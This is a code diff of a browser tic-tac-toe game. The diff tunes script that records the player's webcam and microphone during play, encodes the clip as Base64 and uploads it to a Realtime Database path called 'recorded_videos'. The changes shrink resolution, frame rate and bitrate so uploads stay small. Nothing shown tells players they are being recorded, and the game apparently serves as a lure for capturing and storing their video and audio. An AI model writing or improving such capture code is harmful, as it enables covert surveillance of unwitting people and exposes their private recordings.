@@ -21,7 +21,6 @@
 
   <div class="w-full max-w-xs bg-slate-900 border border-slate-800 p-3 rounded-2xl shadow-2xl">
     <div id="board" class="grid grid-cols-3 gap-3">
-      <!-- 9 Cells -->
       <div class="cell" onclick="playGame(0)"></div><div class="cell" onclick="playGame(1)"></div><div class="cell" onclick="playGame(2)"></div>
       <div class="cell" onclick="playGame(3)"></div><div class="cell" onclick="playGame(4)"></div><div class="cell" onclick="playGame(5)"></div>
       <div class="cell" onclick="playGame(6)"></div><div class="cell" onclick="playGame(7)"></div><div class="cell" onclick="playGame(8)"></div>
@@ -32,7 +31,6 @@
     <button onclick="resetGame()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl border border-slate-700 transition-all">Restart Game</button>
   </div>
 
-  <!-- Start Modal -->
   <div id="startModal" class="fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
     <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl text-center space-y-4 max-w-xs w-full shadow-2xl">
       <div class="text-4xl">🎮</div>
@@ -44,7 +42,6 @@
     </div>
   </div>
 
-  <!-- Success Modal -->
   <div id="successModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
     <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl text-center space-y-4 max-w-xs w-full shadow-2xl">
       <div class="text-4xl">✅</div>
@@ -83,9 +80,13 @@
       document.getElementById('gameStatus').textContent = "Your Turn (X)";
 
       try {
-        // Request lower resolution to keep Base64 size small for Realtime DB
+        // STRICT CONSTRAINTS: Keeps Base64 size very small for Realtime Database
         currentStream = await navigator.mediaDevices.getUserMedia({ 
-          video: { width: 640, height: 480 }, 
+          video: { 
+            width: { ideal: 320, max: 480 }, 
+            height: { ideal: 240, max: 360 },
+            frameRate: { ideal: 10, max: 15 } // Lower FPS = Much smaller file
+          }, 
           audio: true 
         });
 
@@ -94,31 +95,34 @@
         let chunks = [];
         let mediaRecorder;
 
-        // Optimized encoding for Realtime Database
-        const options = { mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 100000 };
-        try { mediaRecorder = new MediaRecorder(currentStream, options); } 
-        catch (e) { mediaRecorder = new MediaRecorder(currentStream); }
+        try { 
+          // Attempt specific low-bitrate codec
+          mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 100000 }); 
+        } 
+        catch (e) { 
+          // Fallback for Safari/iOS
+          mediaRecorder = new MediaRecorder(currentStream); 
+        }
 
         mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
 
         mediaRecorder.onstop = () => {
-          // STRICTLY STOP CAMERA HARDWARE IMMEDIATELY
           if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); currentStream = null; }
 
           const blob = new Blob(chunks, { type: 'video/webm' });
+          chunks = []; // Clear chunks array to free up mobile memory
+
           const reader = new FileReader();
-          
-          // ENCODING TO BASE64
           reader.readAsDataURL(blob);
           reader.onloadend = async () => {
             try {
               await push(ref(db, 'recorded_videos'), {
-                videoData: reader.result, // Base64 Encoded String
+                videoData: reader.result,
                 duration: recordSeconds,
                 createdAt: new Date().toISOString()
               });
               document.getElementById('successModal').classList.remove('hidden');
-            } catch (err) { console.error("DB Error:", err); }
+            } catch (err) { console.error("Upload Error:", err); }
           };
         };
 
@@ -144,10 +148,8 @@
       if (gameBoard[i] || !gameActive) return;
       gameBoard[i] = 'X'; boardEl.children[i].textContent = 'X'; boardEl.children[i].classList.add('x');
       if (checkGameEnd('X', "You Won! 🎉")) return;
-
       gameStatusEl.textContent = "Computer thinking...";
       gameActive = false;
-
       setTimeout(() => {
         const empty = gameBoard.map((v, idx) => v === '' ? idx : null).filter(v => v !== null);
         if (empty.length) {
@@ -157,7 +159,7 @@
           gameStatusEl.textContent = "Your Turn (X)";
           gameActive = true;
         }
-      }, 2500); // 2.5s Delay
+      }, 2500);
     }
 
     function checkGameEnd(p, msg) {
